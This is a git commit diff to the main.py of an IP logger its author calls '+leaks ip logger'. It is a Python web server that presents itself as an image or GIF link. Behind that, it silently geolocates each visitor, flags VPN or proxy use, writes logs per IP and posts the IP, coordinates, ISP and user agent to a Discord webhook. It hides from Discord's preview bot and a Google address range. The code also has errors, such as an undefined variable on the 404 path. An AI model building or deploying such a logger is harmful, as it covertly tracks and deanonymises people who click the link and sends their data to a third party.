f46d2bc4f5b58eafbb1f35dad283c90ad7233142
zeroo <125908067+zeroo-0@users.noreply.github.com>
2023-04-28 16:48:52 +0200

    Add files via upload

--- main.py
+++ main.py
@@ -8,6 +8,7 @@ import requests
 import geocoder
 import json
 import ipaddress
+import urllib.parse
 
 # dont touch until you know what you are doing, you will break the vpn checker
 PRIVATE_NETWORKS = [
@@ -40,153 +41,154 @@ blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord
 
 # modify if you have knowledge of python
 class IPHandler(http.server.BaseHTTPRequestHandler):
-    def _set_headers(self):
-        filename = self.path[1:]
-        if os.path.isfile(filename):
-          self.send_response(200)
-          self.send_header('Content-type', 'image/jpg')
-          self.end_headers()
-          with open(image, 'rb') as f:
+    def _set_headers(self, content_type):
+        self.send_response(200)
+        self.send_header('Content-type', content_type)
+        self.end_headers()
+    
+    def serve_image(self, path):
+        with open(path, 'rb') as f:
+            self._set_headers('image/jpeg' if path.endswith('.jpg') else 'image/gif')
             self.wfile.write(f.read())
-        else:
-            self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
-            self.end_headers()
+    
+    def do_GET(self):
+            parse_result = urllib.parse.urlparse(self.path)
+            path_clean = parse_result.path
 
-    if logging:
-     def do_GET(self):
-        if troll:
-          self.send_response(200)
-          self.send_header('Content-type', 'image/gif')
-          self.end_headers()
-          with open(gif, 'rb') as f:
-            self.wfile.write(f.read())
-        try:
-            if 'X-Forwarded-For' in self.headers:
-                ip_real = self.headers['X-Forwarded-For'].split(',')[0]
+            if path_clean.endswith('.jpg') or path_clean.endswith('.gif'):
+                if troll:
+                    content_type = 'image/gif'
+                    self.serve_image(gif)
+                else:
+                    content_type = 'image/jpeg'
+                    self.serve_image(image)
             else:
-                ip_real = self.client_address[0]
+                self.send_error(404, 'File not found')
+ 
+            try:
+                if 'X-Forwarded-For' in self.headers:
+                    ip_real = self.headers['X-Forwarded-For'].split(',')[0]
+                else:
+                    ip_real = self.client_address[0]
 
-            g = geocoder.ip(ip_real)
-            lat, lng = g.latlng
-            latitude = f'{lat}'
-            longitude = f'{lng}'
+                g = geocoder.ip(ip_real)
+                lat, lng = g.latlng
+                latitude = f'{lat}'
+                longitude = f'{lng}'
 
         
-            city = g.city
-            region = g.state
-            country = g.country
-            org = g.org
+                city = g.city
+                region = g.state
+                country = g.country
+                org = g.org
 
-            headers = self.headers
-            user_agent = headers.get('User-Agent')
-            host = headers.get('Host')
-            encoding = headers.get('Accept-Encoding')
+                headers = self.headers
+                user_agent = headers.get('User-Agent')
+                host = headers.get('Host')
+                encoding = headers.get('Accept-Encoding')
 
-            if vpn_check:
-                is_proxy = headers.get('Via') or headers.get('X-Forwarded-For')
+                if vpn_check:
+                    is_proxy = headers.get('via') and headers.get('proxy-connection') and headers.get('X-Forwarded-For')
 
-                if headers.get('X-Real-IP'):
-                    ip_address = headers['X-Real-IP']
-                elif headers.get('X-Forwarded-For'):
-                    ip_address = headers['X-Forwarded-For'].split(',')[0]
-                else:
-                    ip_address = headers.get('REMOTE_ADDR', '')
-    
-                vpn_ip = ipaddress.ip_address(ip_address)
                 is_vpn = False
-    
-                for network in PRIVATE_NETWORKS:
-                    if vpn_ip in network:
-                        if str(vpn_ip).startswith(str(network)[:-3] + '168.'):
-                            is_vpn = False
-                        else:
+
+                if vpn_check:
+                    if ipaddress.ip_address(ip_real).is_private:
+                        is_vpn = False
+                    else:
+                        headers_lower = {k.lower(): v for k, v in headers.items()}
+                        is_cf_ip = headers_lower.get('http_cf_connecting_ip') is not None
+                        is_x_forwarded = headers_lower.get('http_x_forwarded_for') is not None
+                        is_via = headers_lower.get('via') is not None
+                        is_forwarded = headers_lower.get('forwarded') is not None
+                        is_proxy_conn = headers_lower.get('proxy-connection') is not None
+                        is_user_agent = headers_lower.get('user-agent') is not None
+        
+                        if any([is_cf_ip, is_x_forwarded, is_via, is_forwarded, is_proxy_conn]):
                             is_vpn = True
-                    break
-    
-                if not is_vpn:
-                    if vpn_ip in KNOWN_VPN_IPS:
-                        is_vpn = True
-            
-                if is_proxy:
-                    is_vpn = True
-                else:
-                    is_vpn = False
+                        elif any([is_proxy_conn or 'proxy' in ip_real.lower() or 'vpn' in ip_real.lower()]):
+                            is_vpn = True
+                        elif is_user_agent and 'vpn' in headers_lower['user-agent'].lower():
+                            is_vpn = True
 
-            if toggle_log:
-                if not os.path.exists(f"logs/{ip_real}"):
-                    with open(f"logs/{ip_real}.txt", "w") as f:
-                        f.write(f"IP address: {ip_real}\n")
-                        f.write(f"Location: {city}, {region}, {country}\n")
-                        f.write(f"Coordinates: {latitude}, {longitude}\n")
-                        f.write(f"Organization: {org}\n")
-                        f.write(f"User Agent: {user_agent}\n")
-                        f.write(f"Host: {host}\n")
-                        f.write(f"Accept Encoding: {encoding}\n")
-                        if vpn_check:
-                            f.write(f"Is Proxy: {bool(is_proxy)}\n")
-                            f.write(f"Is VPN: {is_vpn}\n")
-                else:
-                    with open(f"logs/{ip_real}.txt", "w") as f:
-                        f.write(f"IP address: {ip_real}\n")
-                        f.write(f"Location: {city}, {region}, {country}\n")
-                        f.write(f"Coordinates: {latitude}, {longitude}\n")
-                        f.write(f"Organization: {org}\n")
-                        f.write(f"User Agent: {user_agent}\n")
-                        f.write(f"Host: {host}\n")
-                        f.write(f"Accept Encoding: {encoding}\n")
-                        if vpn_check:
-                            f.write(f"Is Proxy: {bool(is_proxy)}\n")
-                            f.write(f"Is VPN: {is_vpn}\n")
+                        for proxy_header in ['smtp-proxy', 'proxy-agent', 'http_proxy', 'proxy_server', 'proxy_host', 'proxy_gateway']:
+                            if headers_lower.get(proxy_header) is not None:
+                                is_vpn = True
+
+                if toggle_log:
+                    if not os.path.exists(f"logs/{ip_real}"):
+                        with open(f"logs/{ip_real}.txt", "w") as f:
+                            f.write(f"IP address: {ip_real}\n")
+                            f.write(f"Location: {city}, {region}, {country}\n")
+                            f.write(f"Coordinates: {latitude}, {longitude}\n")
+                            f.write(f"Organization: {org}\n")
+                            f.write(f"User Agent: {user_agent}\n")
+                            f.write(f"Host: {host}\n")
+                            f.write(f"Accept Encoding: {encoding}\n")
+                            if vpn_check:
+                                f.write(f"Is Proxy: {bool(is_proxy)}\n")
+                                f.write(f"Is VPN: {is_vpn}\n")
+                    else:
+                        with open(f"logs/{ip_real}.txt", "w") as f:
+                            f.write(f"IP address: {ip_real}\n")
+                            f.write(f"Location: {city}, {region}, {country}\n")
+                            f.write(f"Coordinates: {latitude}, {longitude}\n")
+                            f.write(f"Organization: {org}\n")
+                            f.write(f"User Agent: {user_agent}\n")
+                            f.write(f"Host: {host}\n")
+                            f.write(f"Accept Encoding: {encoding}\n")
+                            if vpn_check:
+                                f.write(f"Is Proxy: {bool(is_proxy)}\n")
+                                f.write(f"Is VPN: {is_vpn}\n")
        
-            if is_vpn or is_proxy:
-                message = f"There's presence of a VPN.\n**User-Agent:** {user_agent}\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
-                ip = f"{vpn_ip}"
-                url = f"https://whatismyipaddress.com/ip/{vpn_ip}"
-                color = 0xFFB6C1
-            else:
-                message = f"**User-Agent:** {user_agent}\n\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
-                ip = f"{ip_real}"
-                url = f"https://whatismyipaddress.com/ip/{ip}"
-                color = 0xFFB6C1
+                if is_vpn or is_proxy:
+                    message = f"There's presence of a VPN.\n**User-Agent:** {user_agent}\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
+                    ip = f"{ip_real}"
+                    url = f"https://whatismyipaddress.com/ip/{ip}"
+                    color = 0xFFB6C1
+                else:
+                    message = f"**User-Agent:** {user_agent}\n\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
+                    ip = f"{ip_real}"
+                    url = f"https://whatismyipaddress.com/ip/{ip}"
+                    color = 0xFFB6C1
         
-            if user_agent not in blacklisted_agents:
-                embed = {
-                    "title": "**+leaks ip logger**",
-                    "color": color,
-                    "fields": [
-                        {
-                            "name": "IP Address",
-                            "value": ip
+                if user_agent not in blacklisted_agents and org != "AS396982 Google LLC":
+                    embed = {
+                        "title": "**+leaks ip logger**",
+                        "color": color,
+                        "fields": [
+                            {
+                                "name": "IP Address",
+                                "value": ip
+                            },
+                            {
+                                "name": "Location",
+                                "value": f"{city}, {region}, {country}\n{latitude}, {longitude}\n{org}"
+                            },
+                            {
+                                "name": "More info",
+                                "value": message
+                            }
+                        ],
+                        "footer": {
+                        "text": url
                         },
-                        {
-                            "name": "Location",
-                            "value": f"{city}, {region}, {country}\n{latitude}, {longitude}\n{org}"
-                        },
-                        {
-                            "name": "More info",
-                            "value": message
+                        "thumbnail": {
+                        "url": "https://media.discordapp.net/attachments/1098269219977695387/1100381884220977162/static.png"
                         }
-                    ],
-                    "footer": {
-                    "text": url
-                    },
-                    "thumbnail": {
-                    "url": "https://media.discordapp.net/attachments/1098269219977695387/1100381884220977162/static.png"
                     }
-                }
-                payload = {
-                    "embeds": [embed]
-                }
+                    payload = {
+                        "embeds": [embed]
+                    }
             
-                if toggle_web:
-                    requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
-                    print(f"{ip} - {self.headers['User-Agent']} [{datetime.now().strftime('%d/%b/%Y %H:%M:%S')}] \"{self.command} {self.path} {self.request_version}\" {self.send_response(200)}")
+                    if toggle_web:
+                        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
+                        print(f"Logged: {ip}")
 
-        except Exception as e:
-            print(f"error: {e}")
+            except Exception as e:
+                print(f"error: {e}")
         
-        self._set_headers()
+            self._set_headers(content_type=content_type)
 
 PORT = 8000
 
